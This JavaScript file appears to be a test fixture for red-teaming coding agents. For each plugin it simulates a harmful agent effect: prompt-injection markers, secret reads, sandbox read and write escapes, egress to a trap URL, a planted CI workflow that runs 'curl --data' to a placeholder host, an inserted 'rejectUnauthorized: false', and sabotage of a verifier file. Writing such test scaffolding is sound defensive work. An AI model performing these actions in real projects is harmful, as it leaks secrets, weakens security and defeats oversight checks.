const fs = require('node:fs/promises');
const path = require('node:path');

// The target performs only the fixture operation selected by the test. Workflow text is never run.
module.exports = class FixtureTarget {
  constructor(options) {
    this.config = options.config;
  }
  id() {
    return 'coding-agent-fixture';
  }
  async callApi(_prompt, context) {
    const { plugin, effect, marker, probe, trap, evidence } = context.vars;
    const dir = context.prompt.config.working_dir;
    let output = 'Fixture complete.';
    const items = [];
    if (effect) {
      switch (plugin) {
        case 'repo-prompt-injection':
        case 'terminal-output-injection':
          output = marker;
          break;
        case 'secret-env-read':
          return {
            output: { items: [{ name: 'fixture', value: process.env.PROMPTFOO_QA_MARKER }] },
          };
        case 'sandbox-read-escape':
          output = await fs.readFile(probe, 'utf8');
          break;
        case 'secret-file-read':
          await fs.writeFile(path.join(dir, evidence), marker);
          break;
        case 'sandbox-write-escape':
          await fs.mkdir(path.join(probe, 'new-directory'));
          break;
        case 'network-egress-bypass':
          await fetch(trap + '/' + marker);
          break;
        case 'procfs-credential-read':
          // Replay recorded process metadata with a synthetic credential.
          items.push({
            type: 'command_execution',
            command: 'fixture-inventory',
            exit_code: 0,
            aggregated_output: marker,
          });
          break;
        case 'delayed-ci-exfil':
          await fs.mkdir(path.join(dir, '.github/workflows'), { recursive: true });
          await fs.writeFile(
            path.join(dir, '.github/workflows/check.yml'),
            'steps:\n  - run: curl --data fixture https://example.invalid/fixture\n',
          );
          break;
        case 'generated-vulnerability':
          await fs.writeFile(
            path.join(dir, 'settings.js'),
            'const options = { rejectUnauthorized: false };\n',
          );
          break;
        case 'automation-poisoning':
          await fs.appendFile(path.join(dir, 'package.json'), '\n');
          break;
        case 'steganographic-exfil':
          await fs.writeFile(path.join(dir, evidence), 'ordinary contents');
          break;
        case 'verifier-sabotage':
          await fs.writeFile(probe, '{"status":"failed"}');
          break;
      }
    } else if (plugin.endsWith('injection')) {
      items.push({
        type: 'command_execution',
        command: 'fixture-log',
        exit_code: 0,
        aggregated_output: marker,
      });
    }
    return { output, raw: { finalResponse: output, items } };
  }
};
